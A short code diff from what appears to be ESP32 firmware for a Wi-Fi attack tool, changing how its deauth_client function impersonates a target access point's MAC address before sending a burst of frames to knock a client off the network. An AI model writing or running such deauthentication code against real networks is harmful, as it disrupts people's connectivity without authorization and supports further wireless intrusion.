@@ -87,10 +87,8 @@ static void deauth_client(const uint8_t *client)
     static uint16_t seq = 0;
     if (seq == 0) seq = (uint16_t)(esp_random() & 0x0FFF);
 
-    uint8_t saved_mac[6];
-    wifi_save_sta_mac(saved_mac);
-    esp_err_t mac_rc = wifi_spoof_sta_mac(s_target);
-    Serial.printf("[clients] set_mac -> BSSID rc=%d\n", (int)mac_rc);
+    esp_err_t mac_rc = wifi_ap_spoof_begin(s_target);
+    Serial.printf("[clients] ap_spoof rc=%d\n", (int)mac_rc);
 
     esp_wifi_set_channel(s_target_ch, WIFI_SECOND_CHAN_NONE);
     for (int i = 0; i < 30; ++i) {
@@ -98,7 +96,7 @@ static void deauth_client(const uint8_t *client)
         delay(5);
     }
 
-    wifi_spoof_sta_mac(saved_mac);
+    wifi_ap_spoof_end();
 }
 
 void feat_wifi_clients(void)
